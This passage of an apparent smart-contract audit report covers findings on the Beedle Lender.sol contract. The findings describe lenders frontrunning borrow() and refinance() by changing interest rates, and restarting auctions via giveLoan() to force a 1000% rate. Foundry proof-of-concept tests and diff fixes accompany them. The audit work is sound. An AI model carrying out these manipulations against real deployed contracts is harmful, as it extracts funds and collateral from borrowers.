The problem is that the borrower can be frontrunned by a malicious lender changing the pool interest or a legitimate lender can change his pool interests while the `refinance()` function is executing making the borrower to take non-agreed interest by chance. Please see the next scenario:

1. Borrower calls the `refinance()` function because he wants to transfer his debt to a pool which has a 0.01% interest rate.
2. Legitimate lender just change his pool interests to 0.3% using the [updateInterestRate()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L221) function. This function is executed before the `step1` because the lender pay more gas.
3. The `refinance()` transaction is now executed but the pool interest has increased, now the borrower [end up with a different pool interest](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688) (`0.3%`).

## Impact

The borrower may end up paying more pool interests via a malicious lender frontrun or lender changing interest rate by chance while the borrower refinance is executing.

## Tools used

Manual review

## Recommendations

Add a validation in the `refinance()` function which helps the borrower to specify the interest he is allowed to pay:

```diff
struct Refinance {
    /// @notice the loan ID to refinance
    uint256 loanId;
    /// @notice the pool ID to refinance to
    bytes32 poolId;
    /// @notice the new desired debt amount
    uint256 debt;
    /// @notice the new desired collateral amount
    uint256 collateral;
++  /// @notice pool interest the borrower is allowed to pay
++  uint256 poolInterest;
}
```

```diff
    function refinance(Refinance[] calldata refinances) public {
        for (uint256 i = 0; i < refinances.length; i++) {
            uint256 loanId = refinances[i].loanId;
            bytes32 poolId = refinances[i].poolId;
            bytes32 oldPoolId = keccak256(
                abi.encode(
                    loans[loanId].lender,
                    loans[loanId].loanToken,
                    loans[loanId].collateralToken
                )
            );
            uint256 debt = refinances[i].debt;
            uint256 collateral = refinances[i].collateral;
++          uint256 poolInterest = refinances[i].poolInterest;

            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.borrower) revert Unauthorized();

            // get the pool info
            Pool memory pool = pools[poolId];

++          if (pool.interestRate != poolInterest) revert();
```
## <a id='M-02'></a>M-02. Malicious lender can frontrun `borrow()` function and make borrowers to pay more interests            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L130

## Summary

The malicious lender can frontrun the `borrow()` function and make borrower to pay more interests.

## Vulnerability Details

The [borrow()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232) function helps to borrow money from a specific pool. The borrower specify the the [next parameters](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L234-L236):

```solidity
struct Borrow {
    /// @notice the pool ID to borrow from
    bytes32 poolId;
    /// @notice the amount to borrow
    uint256 debt;
    /// @notice the amount of collateral to put up
    uint256 collateral;
}
```
The problem is that the borrower transaction can be frontrunned by a malicious lender and make him to pay more interests. Please see the next scenario:

1. Borrower calls `borrow()` function. He specify a pool which has an interest of 0.1%.
2. Malicious lender see the transaction and frontrun it, the changes the pool interest rate to 0.2%.
3. After the step 2, the borrow action is executed onchain and the borrower [acquired a loan](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L256) with 0.2% interest rate.

I created a test where the pool interest rate can be changed at any time using the [setPool()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L130) function:

```solidity
// File: test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_lender_can_change_interestRate_at_anytime" -vvv
//
    function test_lender_can_change_interestRate_at_anytime() public {
        // Malicious lender can frontrun the borrower and make him to pay more interests
        // 1. Lender1 creates the pool with 1000 BIPs interest rate
        // 2. Assert interestRate at 1000 BIPs
        // 3. Lender1 changes the interest rate to 2000
        // 4. Assert interestRate at 2000 BIPs
        //
        // 1. Lender1 creates the pool with 1000 BIPs interest rate
        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 1 * 10**18,
            poolBalance: 1000 * 10**18,
            maxLoanRatio: 2 * 10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        //
        // 2. Assert interestRate at 1000 BIPs
        (,,,,,,,uint256 interestRate,) = lender.pools(poolId);
        assertEq(interestRate, 1000);
        //
        // 3. Lender1 changes the interest rate to 2000
        p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 1 * 10**18,
            poolBalance: 2000 * 10**18,
            maxLoanRatio: 2 * 10**18,
            auctionLength: 1 days,
            interestRate: 2000, // interest rate to 2000
            outstandingLoans: 0
        });
        lender.setPool(p);
        //
        // 4. Assert interestRate at 2000 BIPs
        (,,,,,,,interestRate,) = lender.pools(poolId);
        assertEq(interestRate, 2000);
    }
```

## Impact

Malicious lender can make the borrower to accept loans with high interests. The borrower can [repay()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L292) the debt and choose another pool but he needs to pay fees in the [borrow action](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L265) and in [the repay action](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L322) so at least the borrower will lost some tokens.

## Tools used

Manual review

## Recommendations

Allow the borrower to specify the interest is allowed to accept:

```diff
struct Borrow {
    /// @notice the pool ID to borrow from
    bytes32 poolId;
    /// @notice the amount to borrow
    uint256 debt;
    /// @notice the amount of collateral to put up
    uint256 collateral;
++  /// @noticie the interest the borrower is allowed to accept
++  uint256 interestRate;
}
```

```diff
    function borrow(Borrow[] calldata borrows) public {
        for (uint256 i = 0; i < borrows.length; i++) {
            bytes32 poolId = borrows[i].poolId;
            uint256 debt = borrows[i].debt;
            uint256 collateral = borrows[i].collateral;
++          uint256 borrowerInterestRate = borrows[i].interestRate
            // get the pool info
            Pool memory pool = pools[poolId];
++          if (borrowerInterestRate != pool.interestRate) revert();
```

## <a id='M-03'></a>M-03. Malicious lender can increment the loan interest using the auction process            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L437

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

## Summary

Malicious lender can increment the loan interest using the auction process making the borrower to pay more interests from his loan.

## Vulnerability Details

The malicious lender can abuse of the auction process in order to increment the borrower loan interests. Please see the next scenario:

1. Malicious lender create the pool1 and borrower borrows 100 debt token from the pool at 0.1% interest.
2. Malicious lender starts an auction for the loan using the [startAuction()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L437) function.
3. Now, anybody can buy the auctioned loan using the [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) function. If there is an intention from someone to buy the auctioned loan, the malicious lender frontrun the transaction and cancel the auction via the [giveLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355) function, so now the `buyLoan()` will be reverted because the loan is NOT in auction.
4. The malicious lender repeat the process until nobody cares about the auctioned loan. So now the malicious lender can wait until the end of the auction process and get the [maximum possible interest](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L475).
5. Now, the malicious lender can call `buyLoan()` and assign the loan to a malicious pool which has an maximum possible interest.
6. The borrower loan interest has increased by a malicious lender.

I created a test where the malicious lender1 increments the loan interest rate from 0.1% to 1000%. Test steps:

1. `Lender1` creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
   Borrower borrows 100 debt and put 100 collateral.
2. `Lender1` starts an auction
3. There is an interested pool in buying the loan but `Lender1` frontrun an restart the
   auction via giveLoan(), so the loan is not possible to buy.
4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
   and Pool balance is the same 900 tokens. 
5. It is not possible to buy the loan since the auction was restarted in the step 3.
6. `Lender1` creates a malicious pool in coalition with a malicious actor.
   The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
   another private key.
7. `Lender1` starts the auction again and warp to the end of the auction.
8. `Lender1` buys the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
   The lender1 maliciously increments the loan interest.

```solidity
// test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_malicious_lender_can_increment_loan_interest" -vvv
    function test_malicious_lender_can_increment_loan_interest() public {
        // Malicious lender can increment the loan interest using the auction process
        // 1. Lender1 creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
        //    Borrower borrows 100 debt and put 100 collateral.
        // 2. Lender1 starts an auction
        // 3. There is an interested pool in buying the loan but Lender1 frontrun an restart the
        //    auction via giveLoan(), so the loan is not possible to buy.
        // 4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
        //    and Pool balance is the same 900 tokens. 
        // 5. It is not possible to buy the loan since the auction was restarted in the step 3.
        // 6. Lender1 creates a maliciouspool in coalition with a malicious actor.
        //    The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
        //    another private key.
        // 7. Lender1 starts the auction again and warp to the end of the auction.
        // 8. Lender1 buy the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
        //    The lender1 maliciously increments the loan interest.
        address attacker = address(1337);
        loanToken.mint(address(attacker), 100000*10**18);
        collateralToken.mint(address(attacker), 100000*10**18);
        //
        // 1. Lender1 creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
        //    Borrower borrows 100 debt and put 100 collateral.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        // assert loan debt, loan collateral and final pool balance
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        (,,,,,uint256 collaterlLoan,uint256 newLoanInterestRate,,,) = lender.loans(0);
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
        assertEq(collaterlLoan, 100 * 10**18);
        assertEq(newLoanInterestRate, 1000); // Loan interest 0.1%
        assertEq(poolBalance, 900 * 10**18); // 1000 pool balance - 100 loan debt
        //
        // 2. Lender1 starts an auction
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.startPrank(lender1);
        lender.startAuction(loanIds);
        (,,,,,,,,uint256 auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, block.timestamp); // auction has started
        //
        // 3. There is an interested pool in buying the loan but Lender1 frontrun an restart the
        // auction via giveLoan(), so the loan is not possible to buy().
        //
        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = poolIdLender1;
        lender.giveLoan(loanIds, poolIds); // malicious lender restart the auction using the giveLoan() function
        //
        // 4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
        //    and Pool balance is the same 900 tokens
        //
        (,,,,,,,,auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, type(uint256).max); // auction is restarted
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        (,,,,,collaterlLoan,,,,) = lender.loans(0);
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
        assertEq(collaterlLoan, 100 * 10**18);
        assertEq(poolBalance, 900 * 10**18); // 1000 pool balance - 100 loan debt
        //
        // 5. It is not possible to buy the loan since the auction was restarted in the step 3
        //
        vm.expectRevert(AuctionNotStarted.selector);
        lender.buyLoan(0, keccak256(abi.encode("whateverpoolIdDoesNotMatterBecuaseWillBeRevertedBeforeAnythinElse")));
        vm.stopPrank();
        //
        // 6. Lender1 creates a maliciouspool in coalition with a malicious actor.
        // The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
        // another private key.
        //
        vm.startPrank(attacker);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        Pool memory attackerP = Pool({
            lender: attacker,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 100000, // maximum interest
            outstandingLoans: 0
        });
        bytes32 poolIdAttacker = lender.setPool(attackerP);
        vm.stopPrank();
        //
        // 7. Lender1 starts the auction again and warp to the end of the auction.
        //
        vm.startPrank(lender1);
        lender.startAuction(loanIds);
        // warp
        vm.warp(block.timestamp + 24 hours);
        //
        // 8. Lender1 buy the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
        // The lender1 maliciously increments the loan interest.
        //
        lender.buyLoan(0, poolIdAttacker);
        (,,,,,,newLoanInterestRate,,,) = lender.loans(0);
        assertEq(newLoanInterestRate, 100000); // loan interest is 1000% rate
    }
```

## Impact

Malicious lender can make the borrower to pay more interests for the loan without the borrower's consent. Since the interests can be incremented to 1000% the borrower may not be prepared to this increment and lost his collateral.

## Tools used

Manual review

## Recommendations

Don't allow the lender to set the same pool the loan has in the [giveLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355) function so the auction can not be restarted and a malicious lender can not restart the auction and benefit from this process. 

```diff
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
            uint256 loanId = loanIds[i];
            bytes32 poolId = poolIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.lender) revert Unauthorized();
            // get the pool info
            Pool memory pool = pools[poolId];
++          // Validate the pool is not the same
++          if (pool.lender == loan.lender) revert();
```




